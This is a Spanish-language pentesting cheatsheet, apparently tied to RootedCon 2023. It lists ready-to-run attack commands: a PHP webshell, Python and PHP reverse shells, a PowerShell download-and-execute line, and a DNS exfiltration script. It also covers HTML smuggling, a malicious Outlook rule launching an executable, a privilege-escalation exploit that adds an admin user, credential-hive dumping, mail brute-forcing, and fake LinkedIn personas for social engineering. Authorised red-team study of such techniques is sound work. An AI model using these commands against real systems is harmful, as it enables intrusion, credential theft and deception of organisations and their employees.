# Pentester-Cheatsheet-RootedCon2023

# Introducción

Fases 

# **Tunelización**
**proxychains**
   Escaneo de la máquina local sobre la que se ha realizado el túnel `proxychains nmap -sT -F -sV 127.0.0.1`
    
-   Conexión RDP al sistema hacia el que apunta el túnel `proxychains rdesktop 127.0.0.1:3389`
    
-   Conexión SMB a controlador de dominio con usuario domain admin `proxychains smbclient -U \\ \\\\\\c$ U`
- Túnel de PC a Servidor 1: `ssh -D [puerto loca]> [usuario-s1]@[IP servidor1]`
- Redirección de tráfico mediante proxychains 
- Uso del puerto local puesto a la escucha 
	- `cp /etc/proxychains.conf ./` 
	- `nano proxychains.conf` (cambiar la última línea - puerto local a la escucha) 
	- `proxychains [comando]`
- **Encadenamiento de túneles SSH**
- Túnel de Kali a Servidor 1:
    `ssh -L [puerto local]:127.0.0.1:[puerto VPS] [usuario-s1]@[IP servidor1]`

- Túnel de Servidor 1 al Servidor 2 (reutilizando conexión abierta):
    `ssh -D [puerto VPS] [usuario-s2]@[IP servidor2]`

Creación de túneles con 2 VPS diferentes
- Habilitación del servicio TOR:
`service tor start`
- Editar el archivo para usar proxychains mediante TOR
`nano proxychains.conf` (cambiar la última línea - `socks5 127.0.0.1 9050`)
- Creación de túnel SSH mediante TOR:
`proxychains ssh -D [puerto local] [usuario]@[IP servidor]`

## Reconocimiento
**Identificación de sistemas autónomos**
 - Consultas directas a RIRs: whois.arin.net u otros 
- BGP Hurricane: http://bgp.he.net/

Si bien servicios como BGP son útiles y se encuentran actualizados, también se pueden hacer búsquedas para identificar los sistemas autónomos directamente sobre los RIRs correspondientes.
`whois -h whois.arin.net "a [ASN]" | grep -Eo "([0 9.]+){4}/[0 9]+"`

**Identificación de rangos de red**
Para ello se puede hacer uso de diferentes servicios y herramientas como:
- WhoisXMLapi: https://ip-netblocks.whoisxmlapi.com/api
- Herramienta Amass (https://github.com/OWASP/Amass)

`amass intel -org [organizacion]`

**Identificación de dominios**
- Identificación mediante Reverse DNS (WhoisXMLapi) 
-  Identificación mediante por registrador WHOIS (WhoisXMLapi - Reverse WHOIS) 
- Identificación mediante compartición de NS y MX (ViewDNS) 
-  Identificación mediante la resolución inversa de direcciones IP 
-  Identificación mediante Google Hacking (u otros buscadores)
- Reverse NS: https://viewdns.info/reversens/ 
- Reverse MX: https://viewdns.info/reversemx/

**Identificación de subdominios**
- Identificación de subdominios, mostrando la fuente: `amass enum -d [dominio] -src`
 - Identificación de subdominios de forma pasiva, mostrando la fuente:
`amass enum -passive -d [dominio] -src`

en shodan mediante el operador de búsqueda ssl: podemos buscar certificados de subdominios para un dominio dado, permitiendo identificar tanto subdominios como activos en Cloud.

Github: https://github.com/tnt1200/subscan 
Diccionario recomendado:https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/bitquark-subdomainstop100000.txt
SecurityTrails:https://securitytrails.com/list/apex_domain/[dominio]

**Identificación de infraestructura en Cloud**
https://github.com/initstring/cloud_enum

herramientas adicionales tales como CloudScrapper , LazyS3, GCPBucketBrute, aunque Cloud_enum destaca por identificar tanto activos en AWS, Azure o Google.

**Búsqueda de información expuesta en Internet**
búsqueda de posibles leaks: https://cse.google.com/cse/publicurl?cx=012209864558240645678:pownmejpj5w

Encontrar sitios web descentralizados
`site:[domain] ext:php` (cambiar con asp,aspx,jsp...)

Existen multitud de servicios que permiten obtener esta información, tales como: 
https://breachdirectory.org/ 
https://dehashed.com/ 
https://intelx.io/

ver webs obsoletas o con mala pinta
`eyewitness -f --web --prepend-https`

**Análisis de vulnerabilidades**
https://github.com/projectdiscovery/nuclei

## Reconocimiento para el uso de ing. social
Crear linkedin falso
persona que no existe: https://thispersondoesnotexist.com/
sacar mails corporativos
https://github.com/vysecurity/LinkedInt
https://hunter.io/

## Ataques en perímetro
Top priorizar:
 1. File Upload para la subida de reGeorg y acceso a red interna  
 2. SQL Injection para la lectura de información que pueda ser reutilizada o ejecución de comandos 
  3. Deserialización / RCE para la ejecución de comandos 
  4.  XXE para la lectura de ficheros
5. Fuerza bruta en anchura contra empleados a través de aplicaciones corporativas (VPN, Citrix, ) 
6. XSS en aplicaciones relevantes para el robo de sesiones de empleados.

**Subida de ficheros**
Ejemplo de webshell simple: 
`<?php system($_GET['cmd']); ?>`

 - Weevley
    - Generación de Webshell
`weevely generate [clave] [output]`
    - Conexión de weevely con la Webshell subida
`weevely [URL del archivo subido] [clave]`

**Conexiones inversas**
- Python:
`python -c 'import
socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[puer
to]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- PHP:
`php -r '$sock=fsockopen("[IP]",[puerto]);exec("/bin/sh -i [&3 ]&3 2]&3");'`
- Powershell:
`powershell "IEX(New-Object Net.WebClient).downloadString('http://10.9.254.6/test.ps1')"`

Más ejemplos en:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

**Pivoting a través de reGeorg y NeoReGeorg**

Subida del recurso al servidor y verificación de accesibilidad (obtención de mensaje)
- Ejecución del cliente en la máquina atacante:
`python reGeorgSocksProxy.py -u [URL completa] -p [puerto local]`
- Uso de proxychains para pivotar: `proxychains [binario]`
Para evitar posibles problemas es recomendable modificar reGeorg cambiando el mensaje al menos.
Recurso reGeorg: https://github.com/sensepost/reGeorg
Alternativa: https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md

Generación y conexión en base a plantilla proporcionada (ej: error web o 404)
`python neoreg.py generate -k [clave] --file 404.html`
`python neoreg.py -k [clave] -u [URL] --skip`
- Definición de una cookie para validar el acceso:
`python neoreg.py -k [clave] -u [URL] -H 'Authorization: cm9vdDppcyB0d2VsdmU=' --cookie
"key=value;key2=value2"`
- Uso de diferentes archivos (Memory-webshell):
$ python neoreg.py -k [clave] -u [url_1] -u [url_2] -u [url_3] ...

**Exfiltración mediante DNS**
En estos casos se puede hacer uso de herramientas como DNScat (o de forma manual) para establecer un túnel con el atacante mediante el uso del protocolo DNS. Se muestra un simple script para enviar la información vía DNS de forma asíncrona:
`[comando] | xxd -ps -c 200 | tr -d '\n' > out.txt 
i=$(wc -c out.txt | cut -d " " -f1) 
for ((j=0;$i>=0;j++)); 
do x=$(tail -c $i out.txt); 
y=$(echo $x | head -c 60); 
dig @ -p 5053 +short -x $y.; i=$(expr $i - 60); done;
i=$(expr $i - 60); done;`

El mismo script podría modificarse para que acepte los parámetros necesarios como argumentos, de tal forma que pudiera ser subido al servidor y ejecutado cada vez. Importante revisar permisos al subirlo. 
`rm /tmp/out.txt $1 | xxd -ps -c 200 | tr -d '\n' > /tmp/out.txt 
i=$(wc -c /tmp/out.txt | cut -d " " -f1) 
for ((j=0;$i>=0;j++)); 
do x=$(tail -c $i /tmp/out.txt); 
y=$(echo $x | head -c 60); 
dig @$2 -p 5053 +short -x $y.exil.com; 
i=$(expr $i - 60); done;`

Para poder capturar las consultas realizadas se puede hacer uso del siguiente simple servidor DNS: https://gist.github.com/andreif/6069838
- Ejecución del script (corre en el puerto 5053) `$ python dns.py >> out.txt `
- Obtención de subdominios capturados `$ cat out.txt | grep "Reply" -A 4 | grep "IN" | cut -d ";" -f2 | cut -d "." -f3 | xxd -r -p`

**Ataques de fuerza bruta en anchura**
En empresas grandes es fácil encontrar empleados con claves que siguen patrones predecibles como 2019 19. etcétera. Para explotar esta debilidad se pueden realizar las siguientes acciones: 
- Identificación de matrículas de empleados o direcciones de correo 
- Identificación de sistemas sin doble factor de autenticación (auth. contra el dominio interno) 
- Pruebas (1 o 2 al día) contra el listado completo de usuarios obtenido

Uno de los servicios que raras veces tiene doble factor es el correo. Ejemplo de fuerza bruta: 
`ruler -k --domain brute --users users --passwords passwords --verbose`

**Registro de dominio interno en Internet**
En caso de que durante el análisis de información en Internet, o gracias al acceso a algun entorno corporativo, haya sido posible obtener un nombre de dominio interno, es necesario comprobar que este esté registrado. Muchas empresas hacen uso de dominios con TLDs públicos, y en ocasiones estos dominios de uso interno no se registran en Internet.
 Se puede aprovechar de esta vulnerabilidad, registrando el dominio en Internet y redirigiendo todas las peticiones a un servidor que tenga a la escucha una herramienta como Responder (se verá más adelante). Esto no puede permitir la captura de claves en texto claro y principalmente hashes NetNTLMv2 que pueden ser posteriormente crackeados
 
**Ejecución de binario a través de ruler**
Comprobación de reglas: `ruler -k --verbose --email @ -u -p display `
- Creación de regla: `ruler -k --verbose --email @ -u -p add --location '\\\tools\\evilm64.exe' --trigger "popashell" --name maliciousrule --send --subject popashell `
- Eliminación de regla: `ruler -k --verbose --email @ -u -p delete --name maliciousrule `

Cabe destacar que acepta tanto el uso de clave como hash del usuario

**Remote Template Injection**
https://github.com/JohnWoodman/remoteinjector
`python remoteinjector.py -w [URL .dotm malicioso] [archivo]`

**HTML Smuggling**

    <html>
    <head>
    <title>HTML Smuggling</title>
    </head>
    <body>
    <p>This is all the user will see...</p>
    <script>
    function convertFromBase64(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;
    var bytes = new Uint8Array( len );
    for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
    return bytes.buffer;
    }
    var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
    var data = convertFromBase64(file);
    var blob = new Blob([data], {type: 'octet/stream'});
    var fileName = 'test.txt';
    if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
    else {
    var a = document.createElement('a');
    document.body.appendChild(a);
    a.style = 'display: none';
    var url = window.URL.createObjectURL(blob);
    a.href = url;
    a.download = fileName;
    a.click();
    window.URL.revokeObjectURL(url);
    }
    </script>
    </body>
    </html>

## Ataques mediante Wi-Fi
Se muestran a continuación las vulnerabilidades más habituales según el tipo de red: 
- Open: Evasión de medidas de seguridad y visibilidad interna / ataques contra clientes. 
- WEP: Posibilidad de romper la clave con paquetes.
- WPA/WPA2 (PSK): Captura Handshake o PMKID (1º paquete) y recuperación de la clave. 
- WPA/WPA2 (Entreprise): Captura de credenciales/hashes de usuario internos. 
- WPS: Fuerza bruta al PIN si no tiene protección. 
- Ataques contra clientes: Creación de puntos de acceso falsos. Esto mejora con el uso de técnicas de ingeniería social previas tales como llamadas telefónicas, correos, etcétera.

**PatataWifi**
Esta herramienta permite automatizar el desarrollo de ataques contra redes que hagan uso de infraestructura WPA2-Entreprise. Github: https://github.com/jesux/PatataWiFiEnterprise Pasos a seguir: 
- Quemar la ISO en una tarjeta SD 
- Al iniciar ejecutar 'raspi-config' o '/usr/lib/raspi-config/init_resize.sh' y expandir el tamaño de la partición. 
- Verificar el acceso con los usuarios :patatas123 y :patatas123 
- Modificar la configuración en el archivo default.sh para establecer la red a suplantar 
- Las herramientas se lanzan en tmux, hay que usar 'tmux attach' para acceder (ctrl+b + d para salir) 
- Se puede acceder a través de ethernet por la IP 192.168.1.100 o por la que asigna el DHCP 
- La raspberry crea la red X Secure-MGMT- con clave 333 
- Conexión desde la red Wi-Fi a la IP por defecto 172.31.0.1

## Intrusion Física

**Acceso a sistemas mediante Kon-boot**

## PrivEsc - Windows/Linux
Windows:
https://github.com/GhostPack/Seatbelt https://raw.githubusercontent.com/neox41/WinEnum/master/WinEnum.bat https://fareedfauzi.gitbook.io/oscp-notes/windows-post-exploitation/automated-enumeration-script
Linux:
https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

**Windows**
 - Unquoted Service Path
- Permisos inseguros en servicios 
- Permisos inseguros en binarios (de servicios) 
- Hijacking de DLLs 
- Allways Install Elevated 
- UAC Bypass

Hijack DLL:
Cuando un proceso busca una DLL el sistema realiza la búsqueda en las siguientes localizaciones:
- Directorio desde donde se ejecuta la aplicación. 
- Directorio de Windows 32 
- Directorio de Windows System 
- Directorio de instalación de Windows :\ 
- El directorio actual de trabajo (CWD) 
- Directorios incluidos en el PATH del sistema 
- Directorios incluidos en el *PATH del usuario*

Hijacking DLL del proceso IKE: https://raw.githubusercontent.com/itm4n/Ikeext-Privesc/master/Ikeext-Privesc.ps1 Invoke-IkeextCheck Invoke-IkeextExploit -Verbose 
El exploit está predefinido para realizar la siguiente acción: net user hacker SuperP@ss123 /ADD

**Allways Install Elevated**
 - C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 
 - C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

**Bypass UAC**
https://github.com/hfiref0x/UACME
 https://lolbas-project.github.io/
 
- **CompMgmtLauncher**
	- Un ejemplo ampliamente utilizado ha sido CompMgmtLauncher.exe, el cual permite hacer bypass de UAC en sistemas Windows 7, 8 y 8.1. Sabiendo que cuenta con una vulnerabilidad DLL Hijacking, se puede comprobar con sigcheck.exe que tiene la funcionalidad AutoElevate habilitada
	- 
PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc/PowerUp.ps1
PS> Invoke-AllChecks
SharpUp:
https://github.com/GhostPack/SharpUp 
C:\> SharpUp.exe audit

**Identificación de vulnerabilidades en el sistema**
Windows Exploit Suggester (Next Gen.) https://github.com/bitsadmin/wesng 
Sherlock / Watson script (Powershell) https://github.com/rasta-mouse/Sherlock 
PS> Get-InstalledSoftware PS> Find-AllVulns

## Obtención de credenciales

Copiado manual de SAM y SYSTEM para su posterior unificación con: 
C:\> reg save HKLM\sam SAM 
C:\> reg save HKLM\system SYSTEM $ impacket-secretsdump -sam sam.save -system system.save LOCAL

    impacket-secretsdump <dominio>\<usuario>:<clave>@<IP objetivo>

## Referencias

También existen múltiples referencias al uso de Red Teaming para la toma de decisiones:

-   Command Red Team (JDN 1-16)
    
-   Red Team. How to succeed by thinking like the enemy
    
-   Red Teaming. How your business can conquer the competition by challenging everything

